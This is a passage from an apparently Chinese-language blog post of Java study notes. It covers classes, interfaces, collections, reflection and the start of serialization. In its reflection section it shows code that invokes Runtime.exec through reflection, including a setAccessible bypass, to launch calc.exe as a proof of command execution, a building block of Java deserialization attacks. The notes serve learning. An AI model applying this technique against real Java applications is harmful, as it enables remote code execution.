class="line">        System.out.printf(<span class="string">&quot;I am %s, and I am %d years old.\n&quot;</span>, name, age);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1 year later,&quot;</span>);</span><br><span class="line">        n4c1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;I will be %d&quot;</span>, n4c1.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308210528171.png" alt="image-20240308210528171"></p><p><strong>extends</strong></p><p>SuperMan.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMan</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SuperMan</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123; <span class="comment">//创建构造器</span></span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">superPower</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can do this all day!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SuperMan</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan</span>(<span class="string">&quot;n4c1&quot;</span> ,<span class="number">19</span>);</span><br><span class="line">        n4c1.superPower();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308213418330.png" alt="image-20240308213418330"></p><p><strong>implements</strong></p><p>略</p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>与php相似</p><p>略</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><blockquote><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p></blockquote><blockquote><h4 id="接口与类的区别："><a href="#接口与类的区别：" class="headerlink" title="接口与类的区别："></a>接口与类的区别：</h4><ul><li>接口不能用于实例化对象。</li><li>接口没有构造方法。</li><li>接口中所有的方法必须是抽象方法，Java 8 之后 接口中可以使用 default 关键字修饰的非抽象方法。</li><li>接口不能包含成员变量，除了 static 和 final 变量。</li><li>接口不是被类继承了，而是要被类实现。</li><li>接口支持多继承。</li></ul><h4 id="接口特性"><a href="#接口特性" class="headerlink" title="接口特性"></a>接口特性</h4><ul><li>接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li><li>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li><li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li></ul><h4 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h4><ul><li><ol><li>抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li></ol></li><li><ol start="2"><li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li></ol></li><li><ol start="3"><li>接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li></ol></li><li><ol start="4"><li>一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li></ol></li></ul></blockquote><h3 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h3><p>当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。</p><p>Animal.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog travel&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.eat();</span><br><span class="line">        dog.travel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Dog eat</span></span><br><span class="line"><span class="comment">//   Dog travel</span></span><br></pre></td></tr></table></figure><h3 id="接口的多继承"><a href="#接口的多继承" class="headerlink" title="接口的多继承"></a>接口的多继承</h3><p>在Java中，类的多继承是不合法，但接口允许多继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hockey</span> <span class="keyword">extends</span> <span class="title class_">Sports</span>, Event</span><br></pre></td></tr></table></figure><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>在Java中，集合（Collection）是一种用于存储和操作一组对象的数据结构。集合框架（Collection Framework）是Java中的一个重要部分，提供了一系列接口和类，用于表示和操作不同类型的集合。Java的集合框架主要包括以下接口和类：</p><ol><li><strong>Collection 接口：</strong> 是所有集合框架的根接口，它定义了一些基本的方法，如添加、删除、遍历等。<code>List</code>、<code>Set</code> 和 <code>Queue</code> 接口都继承自 <code>Collection</code>。</li><li><strong>List 接口：</strong> 继承自 <code>Collection</code>，表示有序的集合，允许包含重复元素。常见的实现类包括 <code>ArrayList</code>、<code>LinkedList</code> 和 <code>Vector</code>。</li><li><strong>Set 接口：</strong> 也继承自 <code>Collection</code>，表示不包含重复元素的集合。常见的实现类包括 <code>HashSet</code>、<code>LinkedHashSet</code> 和 <code>TreeSet</code>。</li><li><strong>Queue 接口：</strong> 继承自 <code>Collection</code>，表示一种队列的数据结构，常见的实现类包括 <code>LinkedList</code> 和 <code>PriorityQueue</code>。</li><li><strong>Map 接口：</strong> 表示键值对的集合，每个键映射到一个值。常见的实现类包括 <code>HashMap</code>、<code>LinkedHashMap</code>、<code>TreeMap</code> 和 <code>HashTable</code>。</li></ol><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>反射有关的API：</p><blockquote><p>java.lang.Class: 代表一个类<br>java.lang.reflect.Method: 代表类的方法<br>java.lang.relect.Field: 代表类的成员变量<br>java.lang.reflect.Constructor: 代表类的构造器</p></blockquote><p>由于Class类是private私有属性, 其构造器是私有的, 我们无法直接new Class();围绕如何获取Class类的对象来学习反射机制</p><h2 id="类的-class属性"><a href="#类的-class属性" class="headerlink" title="类的.class属性"></a>类的.class属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;  <span class="comment">///////////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="实例化对象的getClass-方法"><a href="#实例化对象的getClass-方法" class="headerlink" title="实例化对象的getClass()方法"></a>实例化对象的getClass()方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> p1.getClass(); <span class="comment">/////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: I am n4c1, and I am 19 years old.</span></span><br><span class="line"><span class="comment">//class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="Class-forName-String-className-：动态加载类"><a href="#Class-forName-String-className-：动态加载类" class="headerlink" title="Class.forName(String className)：动态加载类"></a>Class.forName(String className)：动态加载类</h2><p>调用Class类中的forName方法，将字节码文件加载进内存，返回Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><blockquote><p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p><p>而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误；</p><p>而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。</p><p>所以我们在获取class对象中，一般使用Class.forName方法去获取。</p></blockquote><h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><blockquote><p>获取成员变量Field位于java.lang.reflect.Field包中</p><p>Field[] getFields() ：获取所有public修饰的成员变量</p><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) 获取指定名称的 public修饰的成员变量</p><p>Field getDeclaredField(String name) 获取指定的成员变量</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">        Field[] fieldArray1 = c3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray1) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="comment">// com.n4c1.www.Person</span></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// age</span></span><br></pre></td></tr></table></figure><h2 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h2><blockquote><p><strong>Method getMethod(String name, 类&lt;?&gt;… parameterTypes)</strong> &#x2F;&#x2F;返回该类所声明的public方法</p><p><strong>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes)</strong> &#x2F;&#x2F;返回该类所声明的所有方法</p><p>&#x2F;&#x2F;第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</p><p><strong>Method[] getMethods()</strong> &#x2F;&#x2F;获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</p><p><strong>Method[] getDeclaredMethods()</strong> &#x2F;&#x2F; 获取该类中的所有方法</p></blockquote><h2 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h2><blockquote><p>Constructor&lt;?&gt;[] getConstructors() ：只返回public构造函数</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</p><p>Constructor&lt;&gt; getConstructor(类&lt;?&gt;… parameterTypes) : 匹配和参数配型相符的public构造函数</p><p>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes) ： 匹配和参数配型相符的构造函数</p></blockquote><h2 id="通过反射来生成实例化对象"><a href="#通过反射来生成实例化对象" class="headerlink" title="通过反射来生成实例化对象"></a>通过反射来生成实例化对象</h2><h3 id="newInstance-方法创建类对象"><a href="#newInstance-方法创建类对象" class="headerlink" title="newInstance()方法创建类对象"></a>newInstance()方法创建类对象</h3><h3 id="invoke-执行类对象方法"><a href="#invoke-执行类对象方法" class="headerlink" title="invoke()执行类对象方法"></a>invoke()执行类对象方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflectMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反射测试成功!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.reflect.ReflectTest&quot;</span>); <span class="comment">// 创建Class对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance(); <span class="comment">// 创建类实例对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflectMethod&quot;</span>); <span class="comment">// 获取reflectMethod方法</span></span><br><span class="line">            method.invoke(m); <span class="comment">// 调用类实例对象方法</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用反射构造Runtime类执行"><a href="#利用反射构造Runtime类执行" class="headerlink" title="利用反射构造Runtime类执行"></a>利用反射构造Runtime类执行</h2><p>反射弹计算器</p><p><code>C:\\WINDOWS\\System32\\calc.exe</code></p><p>Runtime类的构造方法是private权限私有的,反射机制也是有限制的，并不能饶过private权限的检查。</p><p>因此我们不能使用newInstance()来创建一个对象Runtime()</p><p>但是可以直接调用其类方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">RuntimeMethod</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//通过 getMethod 方法获取 Runtime 类中的 getRuntime 方法的 Method 对象。这个方法用于获取当前运行时对象。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> RuntimeMethod.invoke(c1); <span class="comment">//使用反射调用 getRuntime 方法，得到 Runtime 类的实例。invoke 方法用于调用指定对象的方法，这里调用了 getRuntime 方法。</span></span><br><span class="line">        method.invoke(m, <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c1),<span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="设置setAccessible-true-暴力访问权限"><a href="#设置setAccessible-true-暴力访问权限" class="headerlink" title="设置setAccessible(true)暴力访问权限"></a>设置setAccessible(true)暴力访问权限</h2><blockquote><p>在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。</p><p>Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我并没有成功弹计算器, 不知道是不是jdk版本的问题</p><p>换成jdk1.8这里就可以了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309112318876.png" alt="image-20240309112318876"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><strong>序列化</strong>: ObjectOutputStream.WriteObject</p><p><strong>反序列化</strong>: ObjectInputStream.readObject</p><blockquote><p>只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列</p><p>Serializable 接口是 Java 提供的序列化接口,一个实现 Serializable 接口的子类也是可以被序列化的。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Useri</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Useri</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        Serialize(user);</span><br><span class="line"></span><br><span class="line">        Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Useri obj)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        <span 